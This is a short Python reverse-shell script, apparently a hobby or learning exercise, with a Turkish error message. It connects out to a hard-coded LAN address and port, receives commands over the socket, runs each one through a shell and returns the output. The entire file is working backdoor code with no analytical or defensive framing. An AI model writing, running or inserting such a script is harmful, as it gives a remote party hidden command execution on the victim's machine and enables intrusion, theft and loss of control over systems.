#! /usr/bin/env python
# encoding:utf-8 
import socket
import subprocess
import json

def send_data(data):
    json_data = json.dumps(data.decode())
    socket_connection.send(json_data.encode())

def get_data():
    json_data = ""
    while True:
        try:
            get_data_all = socket_connection.recv(2048)
            json_data = json_data + get_data_all.decode()
            return json.loads(json_data)
        except ValueError:
            continue

def shell():
    while True:
        code = get_data()
        
        if code == "0":
            break
        else:
            try:
                command = subprocess.Popen(code, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = command.stdout.read() + command.stderr.read()
                send_data(result) 
            except: 
                error = "Hata: Komut çalıştırılamadı"
                send_data(error.encode())              


socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_connection.connect(("192.168.1.106", 7171))

shell()
socket_connection.close()